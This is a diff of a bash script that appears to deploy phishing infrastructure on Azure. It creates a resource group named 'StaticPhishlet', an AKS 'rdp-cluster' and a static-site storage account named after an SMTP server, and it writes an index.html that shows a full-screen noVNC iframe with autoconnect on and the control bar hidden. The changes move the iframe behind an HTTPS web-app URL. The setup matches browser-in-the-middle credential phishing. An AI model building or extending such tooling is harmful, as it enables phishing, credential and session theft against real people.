@@ -243,7 +243,10 @@ main() {
     local resource_group="StaticPhishlet-RG-$RANDOM"
     local location="eastus"
     local aks_name="rdp-cluster-$RANDOM"
-    local storage_account_name="staticweb$RANDOM"
+# Extract the first part from smtp_server for storage account naming
+    local smtp_prefix="${smtp_server%%.*}"
+# Ensure the name is lowercase and complies with Azure naming rules (max 24 chars)
+    local storage_account_name="$(echo "${smtp_prefix,,}" | tr -cd 'a-z0-9')$RANDOM"
     local index_file="./index.html"
     local public_ip=""
     local email_body=""
@@ -371,31 +374,23 @@ display_message "Storage Account created: $storage_account_name" "green"
 # -------------------------------------------------------
 # Create index.html with embedded iframe
 
-display_message "Creating index.html with embedded RDP iframe..." "blue"
+display_message "Creating index.html with secure iframe..." "blue"
+
 cat <<EOF > "$index_file"
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Embedded VNC</title>
+    <title>Embedded RDP</title>
     <style>
-        body {
+        body, html {
             margin: 0;
+            padding: 0;
             overflow: hidden;
             background-color: black;
-            display: flex;
-            justify-content: center;
-            align-items: center;
             height: 100vh;
-        }
-        .container {
             width: 100vw;
-            height: 100vh;
-            overflow: hidden;
-            border-radius: 1px;
-            transform: scale(1.16);
-            transform-origin: center;
         }
         iframe {
             width: 100%;
@@ -405,12 +400,11 @@ cat <<EOF > "$index_file"
     </style>
 </head>
 <body>
-    <div class="container">
-        <iframe src="http://$public_ip:6901/vnc.html?autoconnect=true&reconnect=true&resize=on&show_control_bar=false"></iframe>
-    </div>
+    <iframe src="https://${webapp_url}/vnc.html?autoconnect=true&reconnect=true&resize=on&show_control_bar=false"></iframe>
 </body>
 </html>
 EOF
+
 
 
 # Upload index.html to static website container
